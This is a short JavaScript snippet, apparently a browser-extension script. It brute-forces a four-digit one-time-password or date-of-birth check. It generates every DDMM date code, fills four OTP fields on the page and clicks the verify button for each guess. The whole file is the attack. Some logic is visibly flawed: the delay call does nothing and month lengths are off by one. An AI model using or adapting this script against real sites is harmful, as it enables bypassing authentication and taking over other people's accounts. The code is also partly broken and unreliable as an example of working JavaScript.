function find(){
    const otp1=document.getElementById("otp1")
    const otp2=document.getElementById("otp2");
    const otp3=document.getElementById("otp3");
    const otp4=document.getElementById("otp4");
    const btn=document.getElementById("verifyOtp")
    if(true)
    {
            allpw.forEach((pw) =>{
                otp1.value=pw.substring(0,1)
                otp2.value=pw.substring(1,2)
                otp3.value=pw.substring(2,3)
                otp4.value=pw.substring(3,4)
                
                btn.click();
                setTimeout(() =>{},300)
                
            })
    }
    else{
        alert("This extension not support this site");
    }
}

var allpw=[];

for(let i=1;i<=12;i++){
    let lastdt=new Date(2004,i-1,0).getDate();
    for(j=1;j<=lastdt;j++){
        var no=new Date(2004,i-1,j);
        var fomate=new Intl.DateTimeFormat('en-GB', { day: '2-digit', month: '2-digit'});
        var date=fomate.format(no);
        allpw.push(date.split("/").join(""));
    }
}

find();